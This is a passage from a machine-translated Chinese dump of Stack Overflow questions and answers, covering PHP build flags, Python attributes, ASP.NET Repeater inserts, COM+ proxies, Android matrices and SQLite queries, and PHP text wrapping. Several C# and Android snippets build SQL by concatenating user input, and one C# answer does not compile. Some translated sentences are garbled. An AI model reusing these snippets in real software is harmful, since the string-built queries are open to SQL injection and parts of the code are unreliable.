./configure '--prefix=/usr/local/php' '--with-config-file-path=/usr/local/php/lib' '--with-apxs' '--with-iconv=/usr/local/php' '--with-openssl=/usr' '--with-zlib=/usr' '--with-mysql' '--with-pgsql=/Users/marc/cvs/entropy-php4/php-module/build/postgresql-build' '--enable-cgi' '--with-gd' '--with-png-dir=/usr/local/php' '--with-freetype-dir=/usr/local/php' '--with-t1lib=/usr/local/php' '--with-jpeg-dir=/usr/local/php' '--with-tiff-dir=/usr/local/php' '--with-curl=/usr/local/php' '--with-mcal=/usr/local/php' '--with-mcrypt=/usr/local/php' '--with-mhash=/usr/local/php' '--with-pdflib=/usr/local/php' '--with-imap=../imap-2002d' '--with-imap-ssl=/usr' '--with-expat-dir=/usr/local/php' '--with-gettext=/usr/local/php' '--with-dom=/usr/local/php' '--with-dom-xslt=/usr/local/php' '--with-dom-exslt=/usr/local/php' '--with-xslt-sablot=/usr/local/php' '--with-mime-magic=/usr/local/php/etc/magic.mime' '--with-mssql=/usr/local/php' '--with-fbsql=/Users/marc/cvs/entropy-php4/php-module/build/frontbase-build/Library/FrontBase' '--with-ming=/Users/marc/cvs/entropy-php4/php-module/build/ming-build' '--enable-xslt' '--with-ldap' '--with-xml' '--with-xmlrpc' '--with-iodbc=/usr' '--enable-sockets' '--enable-dbx' '--enable-dbase' '--enable-trans-sid' '--enable-exif' '--enable-wddx' '--enable-ftp' '--enable-mbstring' 
```

这个例子有很多启用的模块。您还可以在 phpinfo 中查看用于编译当前 PHP 版本的“配置行”（它就在顶部，第三行）。

# python - 哪些属性没有存储在 __dict__ 中，为什么没有？

> ID：10446139
> 
> 赞同：0
> 
> 时间：2012-05-04T09:23:39.137
> 
> 标签：python

在 Python 中，对象的许多“特殊”属性都存储在`__dict__`字典中，例如`__doc__`, `__module__`（从我的实验中可以看到）。

但是有些不是，例如`__class__`. 我的问题是哪些属性没有存储`__dict__`（甚至记录在某处吗？），为什么没有？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T09:28:22.040

这取决于`__dict__`你在说什么。Python有一个方法解析顺序（忽略多重继承的乐趣）通过检查实例，然后是类，然后是父类，然后是父类等来工作......

因此`__class__`，例如， is in `object.__dict__`- 这就是为什么它是为所有类定义的，因为它们继承自`object`.

# c# - 如何动态插入/编辑来自转发器的值？

> ID：10446142
> 
> 赞同：3
> 
> 时间：2012-05-04T09:24:00.040
> 
> 标签：c#, asp.net, repeater, add, insert-update

**.aspx 页面**是这样的

```
<form id="Form1" runat="server">  
<asp:Repeater ID="Repeater1" runat="server">
    <HeaderTemplate>
            <table border="0" width="600px" cellpadding="2" cellspacing="1" style="border: 1px solid maroon;">
        <tr bgcolor="maroon">
            <th>    Subject_Id    </th>
            <th>    Subject_Name    </th>
            <th>    Fill_Marks    </th>
        </tr>
</HeaderTemplate>

<ItemTemplate>
    <tr>
        <td width="100">
                <asp:TextBox ID="Subject_Id" runat="Server" Text='<%#Eval("Subject_Id")%>'></asp:TextBox>
        </td>
        <td>
                <asp:TextBox ID="Subject_Name" runat="Server" Text='<%#Eval("Subject_Name")%>'></asp:TextBox>
        </td>
        <td>
                <asp:TextBox ID="Marks" runat="server"></asp:TextBox>
        </td>
    </tr>
</ItemTemplate>

    <FooterTemplate>
</table>
</FooterTemplate>
</asp:Repeater>

    <asp:Button ID="btnInsert" runat="server" onclick="btnInsert_Click" Text="Insert" CommandArgument="" CommandName=""/>
    <asp:Button ID="btnUpdate" runat="server" onclick="btnUpdate_Click" Text="Update" CommandArgument="" CommandName=""/>    

    </form> 
```

C# - 代码背后...

```
 protected void btnInsert_Click(object sender, EventArgs e)
  {
   cn = new SqlConnection(ConfigurationManager.ConnectionStrings["DbConnect"].ConnectionString);
   cn.Open();

  foreach (RepeaterItem item in Repeater1.Items)
  {
      TextBox Subject_Id = (TextBox)item.FindControl("Subject_Id");
      TextBox Subject_Name = (TextBox)item.FindControl("Subject_Name");
      TextBox Marks = (TextBox)item.FindControl("Marks");

      SqlCommand cmd = new SqlCommand("Insert into result VALUES (id='"+@Subject_Id+"',name='"+@Subject_Name+"',marks='"+@Marks+"')", cn);

      Repeater1.DataSource = cmd.ExecuteReader();
      Repeater1.DataBind();

      cn.Close();
      cmd.Connection.Close();
      cmd.Connection.Dispose();
  }
} 
```

现在我想将该数据插入下表.....

结果表

```
id    varchar(10)
name  varchar(20)
marks varchar(3) 
```

我如何执行插入和更新功能以从数据库中检索数据......用简单的方法？? 谢谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:45:31.270

使用以下代码实现**btnInsert_Click**函数

** 根据您的新功能进行编辑

```
 protected void btnInsert_Click(object sender, EventArgs e)
  {
    String connectionString = ConfigurationManager.ConnectionStrings["DbConnect"].ConnectionString;
    String queryString = "";
     using (SqlConnection connection = new SqlConnection(connectionString))
    {
        foreach (RepeaterItem item in Repeater1.Items)
       {
        TextBox Subject_Id = (TextBox)item.FindControl("Subject_Id");
        TextBox Subject_Name = (TextBox)item.FindControl("Subject_Name");
        TextBox Marks = (TextBox)item.FindControl("Marks");

        queryString = "Insert into result VALUES (id='"+@Subject_Id+"',name='"+@Subject_Name+"',marks='"+@Marks+"')";

        SqlCommand command = new SqlCommand(queryString, connection);

        // execute the query to update the database
        cmd.ExecuteNonQuery();
        }
    }
    //call the function to load the gridview if it is lost on postback.
  } 
```

最好将数据库和网格视图填充代码移动到单独的函数中，以便在单击按钮时轻松重复操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:05:28.713

在按钮标签中插入一些属性：CommandArgument="" CommandName=""

```
Repeater1.ItemCommand +=new RepeaterCommandEventHandler(Repeater1_ItemCommand); 
```

创建一个名为 protected void Repeater1_ItemCommand(object source, RepeaterCommandEventArgs e){ 一些你想写的代码......}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-12-08T05:03:32.867

```
Dim permissionList As New List(Of OPASWCFApp.PROJECT_NOTE_CONTACT_MAP)
  For Each rItem As RepeaterItem In rptProducts.Items
     Dim qty1 As Integer
     Dim qty2 As Integer
     Dim hdnvalue As Integer
     Dim txtBox1 As TextBox = DirectCast(rItem.FindControl("numAdmin1"), TextBox)
     Dim txtBox2 As TextBox = DirectCast(rItem.FindControl("numAdmin2"), TextBox)
     Dim hdnf As HiddenField = DirectCast(rItem.FindControl("hdnContacttype"), HiddenField)
     qty1 = Convert.ToInt32(txtBox1.Text)
     qty2 = Convert.ToInt32(txtBox2.Text)
     hdnvalue = Convert.ToInt32(hdnf.Value)

     If qty1 > 0 Or qty2 > 0 Then
        Dim _d As OPASWCFApp.PROJECT_NOTE_CONTACT_MAP = 
                     New OPASWCFApp.PROJECT_NOTE_CONTACT_MAP()
        _d.PROJECT_NOTE_CONTACT_MAP_CONTACT_TYPE_ID = hdnvalue
        _d.PROJECT_NOTE_CONTACT_MAP_DURATION = CInt((qty1 * 60) + qty2)
        _d.PROJECT_NOTE_CONTACT_MAP_CONTACT_TYPE_ID = hdnvalue
        permissionList.Add(_d)
     End If
 Next
 ProcessDataResult.ContactMap = permissionList.ToArray() 
```

# c# - 在没有安装代理的情况下在 COM+ 中调用远程 .NET DLL

> ID：10446144
> 
> 赞同：0
> 
> 时间：2012-05-04T09:24:16.477
> 
> 标签：c#, .net, com, com-interop, com+

我们有一个完全使用 .NET 4.0 (C#) 开发的三层应用程序。作为企业应用服务器，我们使用 COM+ 1.5（我知道它有点过时......）。有一个服务器部分和一个客户端部分都是用 C# 为 .NET 4.0 开发的。

服务器部分公开了继承 ServicedComponent 类的服务并返回实现“Serializable”属性的对象。客户端通过组件的 COM+ 导出代理调用远程类。我们通过 ClickOnce 分发客户端应用程序，我们必须以管理员权限将 COM+ 生成的代理安装到每台客户端计算机上。这是不好的地方。

因此，我们正在尝试评估其他允许我们消除此代理安装的技术，但目前还不清楚如何做到这一点。我们希望找到一种低影响的方式，允许我们使用相同的 COM+ 部分，并以某种方式将代理包括到客户端代码中。

我们尝试在客户端部分使用这样的代码，但仍然需要 COM 注册。

```
Type comObjectType = Type.GetTypeFromProgID("SumNameSpace.SumClass", "servercomplus", true);
SumInterface comObject = Activator.CreateInstance(comObjectType) as SumInterface; 
```

我们认为在客户端部分使用接口而不是类必须工作，但我们有一个例外：

```
Runtime.InteropServices.COMException (0x800401F3): Invalid class string (Exception from HRESULT: 0x800401F3 (CO_E_CLASSSTRING)) 
```

如果 Windows 注册表中没有有关接口的正确信息，则应该会发生此错误，但我们不知道...

任何想法？

多谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-10T05:49:09.977

毫无疑问，您需要在所有客户端计算机上安装 COM+ 代理，并且您希望使用代理安装包安装它。您收到的错误是注册表中 HKEY_CLASSES_ROOT 配置单元下缺少 ProgID 条目的结果。除其他外，此注册表项由安装包提供。这不是代理安装程序提供的全部；[我在这里](http://msdn.microsoft.com/en-us/library/windows/desktop/ms680546(v=vs.85).aspx)找到了一个很好的概述。

听起来您真正想要的是为您的 ClickOnce 部署创建自定义应用程序清单。这应该允许您将代理安装程序作为引导先决条件捆绑到 ClickOnce 部署中。但是，安装仍需要管理权限；我没有看到解决办法（见下面的注释）。这是[一个链接到一个工具的链接，该工具与由 Stackoverflow 用户](http://www.clickoncemore.net/home.php)[Greg Jackman](https://stackoverflow.com/users/389816/greg-jackman)创建的 ClickOnce 清单一起使用。我对此没有任何经验，但根据 Greg 的帖子，它看起来可能对您有所帮助。

最后一点：即使您确实找到了以非提升用户身份运行安装包的方法，您也不想这样做。运行 non-elevated 将改变包与注册表交互的方式。短篇小说，它会默默地失败。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:17:12.983

使用组策略分发组件？

# android - android画布中位图的同时旋转、平移和缩放

> ID：10446154
> 
> 赞同：5
> 
> 时间：2012-05-04T09:24:48.527
> 
> 标签：android, matrix, android-canvas

我正在尝试展示一张可以缩放和平移的图片，并且可以通过指南针读数旋转。使用下面的代码，所有三个操作都可以工作，但它们会相互影响。

这是我想要实现的目标：
1\. 围绕屏幕中心旋转
2\. 缩放，将图片的相同部分留在中心
3\. 平移到图片中的所需位置

以下是以下代码实际发生的情况：
1\. 旋转按预期工作，围绕屏幕中心
2\. 缩放有效，但它围绕*图片中心*缩放 3\. 只有当为零时，
翻译才会按预期工作，否则`angle`它朝着错误的方向发展

```
// the center of the view port
float centerX = screen.right/2;
float centerY = screen.bottom/2;

Matrix m = new Matrix();
m.preRotate(angle, centerX, centerY);
m.preScale(mScaleFactor, mScaleFactor, centerX, centerY);

// scaling the amount of translation, 
// rotating the translation here gave crazy results
float x = mPosX / mScaleFactor;
float y = mPosY / mScaleFactor;
m.preTranslate(x, y);

canvas.drawBitmap(pic, m, null); 
```

如果我先平移，然后再旋转，则平移会按预期工作，但旋转不再围绕视口的中心。

我怎样才能应用所有三种转换，而不会使它们相互影响？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:38:28.007

我不确定围绕图像中心的缩放比例，但至于平移方向错误，这不是因为您旋转图像而不是平移的结果吗？也许尝试这样的事情：

```
float x = (mPosX*(cos(angle) + sin(angle)) / mScaleFactor;
float y = (mPosY*(cos(angle) - sin(angle)) / mScaleFactor;
m.preTranslate(x, y); 
```

矩阵对象也有直接应用[仿射变换](http://en.wikipedia.org/wiki/Transformation_matrix#Affine_transformations)的方法吗？因为那样你就不需要考虑操作的顺序了。

仿射变换可能如下所示：

```
M = |mScaleFactor*cos(angle)       sin(angle)            x|
    |     -sin(angle)          mScaleFactor*cos(angle)   y|
    |          0                         0               1| 
```

但这将围绕图像的角落旋转，因此您需要先使用 preTranslate() 函数，如下所示：

```
Mt.preTranslate(-centerX,-centerY); 
```

并在应用 M 之前将 Mt 应用于 pic，然后在您需要应用 -Mt 之后

# android - 使用 selectionArgs 在查询中不起作用

> ID：10446155
> 
> 赞同：4
> 
> 时间：2012-05-04T09:24:54.767
> 
> 标签：android, sqlite

我正在尝试使用以下内容：

```
String dbquery = "Select * From stops where stopname LIKE '%?%' LIMIT 100";
String[] uinputarray = {uinput};
Cursor c = sDB.rawQuery(dbquery, uinputarray); 
```

这一直崩溃。

奇怪的是，如果我使用旧的测试代码：

```
Cursor c = sDB.rawQuery("Select * From stops where stopname LIKE '%" + uinput + "%' LIMIT 100", null); 
```

它完美无缺。

我一直在阅读 selectionArgs，老实说，我看不出我所做的有什么问题。

我究竟做错了什么？

多谢你们

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-04T09:33:16.887

您必须将 % 附加到 selectionArgs 本身：

selectionArgs = new String[] { searchString + "%" };

光标 c = db.rawQuery("SELECT column FROM table WHERE column=?", selectionArgs);

注意：因此，searchString 字符串中的 % 和 _ 仍可用作通配符！

# iphone - 命令 /Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin/clang 失败，iPhone 中的退出代码为 1

> ID：10446160
> 
> 赞同：1
> 
> 时间：2012-05-04T09:25:08.013
> 
> 标签：iphone, objective-c, facebook, ios5, exit-code

我正在尝试将 Facebook 集成到我的应用程序中。将 FBconnect 文件复制到我的应用程序并运行它时，我的应用程序显示上述错误。如果我删除 FBconnet 文件，应用程序就没有错误。问题是什么？

上面显示的错误是：

```
ProcessPCH /Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/PrecompiledHeaders/fExample2-Prefix-dgpfiszavygwrjgnbbtfhrwetzpp/fExample2-Prefix.pch.pth fExample2/fExample2-Prefix.pch normal i386 objective-c com.apple.compilers.llvm.clang.1_0.compiler
cd /Users/patrontechnosoft/Desktop/fExample2
setenv LANG en_US.US-ASCII
setenv PATH "/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin:/Developer/usr/bin:/usr/bin:/bin:/usr/sbin:/sbin"
/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin/clang -x objective-c-header -arch i386 -fmessage-length=0 -fdiagnostics-print-source-range-info -fdiagnostics-show-category=id -fdiagnostics-parseable-fixits -std=gnu99 -fobjc-arc -Wno-trigraphs -fpascal-strings -O0 -Wmissing-prototypes -Wreturn-type -Wparentheses -Wswitch -Wno-unused-parameter -Wunused-variable -Wunused-value -Wno-shorten-64-to-32 -DDEBUG=1 -isysroot /Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator5.0.sdk -fexceptions -fasm-blocks -mmacosx-version-min=10.6 -gdwarf-2 -Wno-sign-conversion -fobjc-abi-version=2 -fobjc-legacy-dispatch "-DIBOutlet=__attribute__((iboutlet))" "-DIBOutletCollection(ClassName)=__attribute__((iboutletcollection(ClassName)))" "-DIBAction=void)__attribute__((ibaction)" -D__IPHONE_OS_VERSION_MIN_REQUIRED=30200 -iquote /Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/Intermediates/fExample2.build/Debug-iphonesimulator/fExample2.build/fExample2-generated-files.hmap -I/Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/Intermediates/fExample2.build/Debug-iphonesimulator/fExample2.build/fExample2-own-target-headers.hmap -I/Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/Intermediates/fExample2.build/Debug-iphonesimulator/fExample2.build/fExample2-all-target-headers.hmap -iquote /Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/Intermediates/fExample2.build/Debug-iphonesimulator/fExample2.build/fExample2-project-headers.hmap -I/Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/Products/Debug-iphonesimulator/include -I/Users/patrontechnosoft/Desktop/New -IGMAT -I- -IPractice/facebook-iphone-sdk/src -I/Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/Intermediates/fExample2.build/Debug-iphonesimulator/fExample2.build/DerivedSources/i386 -I/Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/Intermediates/fExample2.build/Debug-iphonesimulator/fExample2.build/DerivedSources -F/Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/Products/Debug-iphonesimulator -c /Users/patrontechnosoft/Desktop/fExample2/fExample2/fExample2-Prefix.pch -o /Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/PrecompiledHeaders/fExample2-Prefix-dgpfiszavygwrjgnbbtfhrwetzpp/fExample2-Prefix.pch.pth -MMD -MT dependencies -MF /Users/patrontechnosoft/Library/Developer/Xcode/DerivedData/fExample2-hazidfxqkfibktcxoeovnngtzsxo/Build/PrecompiledHeaders/fExample2-Prefix-dgpfiszavygwrjgnbbtfhrwetzpp/fExample2-Prefix.pch.d 
```

clang：错误：不支持'-I-'，请改用-iquote 命令/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin/clang 失败，退出代码为 1

# php - 如何用不同的长度/字符串修改换行？

> ID：10446162
> 
> 赞同：1
> 
> 时间：2012-05-04T09:25:27.677
> 
> 标签：php, css, word-wrap

我的代码有问题，我不明白。有人可以帮忙吗？

```
$query="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";
$seq=chunk_split($query,50,"<br />");
$truecol = "<span style=\"color: hsl(0,100%,25%);\">";
function colorSequence ($seq,$position,$truecol,$TFBSlength){
    $nucleotides = str_split($seq);
    foreach ($nucleotides as $index => $nucl){
        if ($index == $position){
            echo $truecol;
        }
        if ($index == $position + $TFBSlength){
            echo "</span>";
        }

        echo $nucl;
    }
    echo "\n";
}
colorSequence($seq,49,$truecol,1);
?> 
```

这是我的代码。基本上我希望输出代码看起来像这样： `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(red)A(/red) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCC CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC`

当我运行该函数时它确实如此 `colorSequence($seq,49,$truecol,1);` 但是如果我运行 `colorSequence($seq,49,$truecol,3);`我得到这个：（ `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA< span="">r />AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCC CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC<>`来自字母 49 的所有字母都是红色的，即使我只希望从 49 到 51 的 3 个字母是红色的）。

谁能解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:00:34.130

```
$query="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";
$seq=chunk_split($query,50,'');
$truecol = "<span style=\"color: hsl(0,100%,25%);\">";
function colorSequence ($seq,$position,$truecol,$TFBSlength){
    $nucleotides = str_split($seq);
    foreach ($nucleotides as $index => $nucl){
        if ($index == $position){
            echo $truecol;
        }
        if ($index == $position + $TFBSlength){
            echo "</span>";
        }
        if(($index%50)==0){
            echo '<br>';
        }

        echo $nucl;
    }
    echo "\n";
}
colorSequence($seq,49,$truecol,1);
echo '<hr>';
colorSequence($seq,49,$truecol,3) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T09:42:11.717

如果你`print_r($nucleotides)`，你会看到

```
Array
(
    ......
    [49] => A
    [50] => <
    [51] => b
    [52] => r
    [53] =>  
    ......
) 
```

所以你要插入`<span>`破坏`<br />`以下html的...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T09:34:45.263

您的函数添加的 span 标签会破坏由`chunk_split`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T13:15:13.810

当您修改 DNS 字符串`$query`时，您需要区分核苷酸的位置和一般字符串偏移量。

虽然起初两者是相同的，但添加到字符串中的越多，差异就越大。

如果您将字符串封装到它自己的对象中，该对象负责处理 HTML 标签并且不计算它们（包括标签周围的空格），事情就变得容易了：

```
$query = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";

// wrap line: 11 lines à 50 nucleotids
$seq = chunk_split($query, 50, "<br />\n");

// get help from sequence object
$sequence = new AmendSequence($seq);

// some HTML comments for demonstration purposes
$sequence->insertAt(0, "<!-- first line -->\n");
$sequence->insertAt(50, "<!-- second line -->\n", TRUE); # TRUE: Place after <br />
$sequence->insertAt(75, "<!-- inside second line -->");
$sequence->insertAt(550, "<!-- at end -->", TRUE); # TRUE: Place after <br />

// colorize
$color = '<span style="color: hsl(0,100%,25%);">';
$sequence->insertAt(49, $color);
$sequence->insertAt(50, '</span>');

printf("Sequence with %d nucleotids:\n", count($sequence)); # count gives length w/o amends
echo $sequence, "\n"; # that prints your sequence with all amends 
```

这将创建以下输出：

```
Sequence with 550 nucleotids:
<!-- first line -->
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color: hsl(0,100%,25%);">A</span><br />
<!-- second line -->
AAAAAAAAAAAAAAAAAAAAAAAAA<!-- inside second line -->AAAAAAAAAAAAAAAAAAAAAAAAA<br />
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br />
AAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br />
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br />
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br />
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCC<br />
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC<br />
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC<br />
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC<br />
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC<br />
<!-- at end --> 
```

所以这里真正的魔法是`insertAt`接受核苷酸的偏移位置并为其计算字符串偏移的方法。这一切都封装在一个它自己的类中，这对于开始可能有点过多，但真正的动作是将包含 DNA 和 HTML 的字符串划分为仅 DNS 的段并获取它们的实际字符串偏移量。完整的源代码：

```
<?php
/**
 * @link http://stackoverflow.com/questions/10446162/how-to-wordwrap-with-different-length-string-modification
 */

/**
 * Treat text with "tags" as text without tags when insertAt() is called.
 */
class AmendSequence implements IteratorAggregate, Countable
{
    /**
     * regex pattern for a tag
     */
    const TAG = '\s*<[^>]*>\s*';

    /**
     * @var string
     */
    private $query;

    /**
     * @param string $query
     */
    public function __construct($query = '')
    {
        $this->setQuery($query);
    }

    /**
     * @param int $offset
     * @param string $string
     * @param bool $after (optional) prefer after next tag instead before
     */
    public function insertAt($offset, $string, $after = FALSE)
    {
        $offset = $this->translate($offset, $after);
        $this->query = substr_replace($this->query, $string, $offset, 0);
    }

    /**
     * Translate virtual offset to string offset
     * @param int $virtualOffset
     * @return int
     * @throws InvalidArgumentException
     */
    public function translate($virtualOffset, $after)
    {
        if ($virtualOffset < 0) throw new InvalidArgumentException(sprintf('Offset can not be lower than 0, is %d.', $virtualOffset));
        $virtualCurrent = 0;
        foreach ($this as $segment) {
            list(, $current, $length) = $segment;
            $delta = ($virtualOffset - $virtualCurrent) - $length;
            if ($delta < 0 || ($delta === 0 && !$after)) {
                return $current + $length + $delta;
            }
            $virtualCurrent += $length;
        }
        if ($virtualCurrent === $virtualOffset && $after) {
            return strlen($this->query);
        }
        throw new InvalidArgumentException(sprintf('Offset can not be larger than %d, is %d.', $virtualCurrent, $virtualOffset));
    }

    /**
     * @return array
     */
    public function getSegments()
    {
        $segments = preg_split('/' . self::TAG . '/', $this->query, 0, PREG_SPLIT_OFFSET_CAPTURE | PREG_SPLIT_NO_EMPTY);
        foreach ($segments as &$segment) {
            $segment[2] = strlen($segment[0]);
        }
        return $segments;
    }

    public function getSequence()
    {
        $buffer = '';
        foreach ($this as $segment) {
            $buffer .= $segment[0];
        }
        return $buffer;
    }

    /**
     * @return string
     */
    public function getQuery()
    {
        return $this->query;
    }

    /**
     * @param string $query
     */
    public function setQuery($query)
    {
        $this->query = (string)$query;
    }

    /**
     * Retrieve an external iterator
     * @link http://php.net/manual/en/iteratoraggregate.getiterator.php
     * @return Traversable An instance of an object implementing <b>Iterator</b> or <b>Traversable</b>
     */
    public function getIterator()
    {
        return new ArrayIterator($this->getSegments());
    }

    /**
     * @link http://php.net/manual/en/countable.count.php
     * @return int The custom count as an integer.
     */
    public function count()
    {
        $length = 0;
        foreach ($this as $segment) {
            $length += $segment[2];
        }
        return $length;
    }

    /**
     * @return string
     */
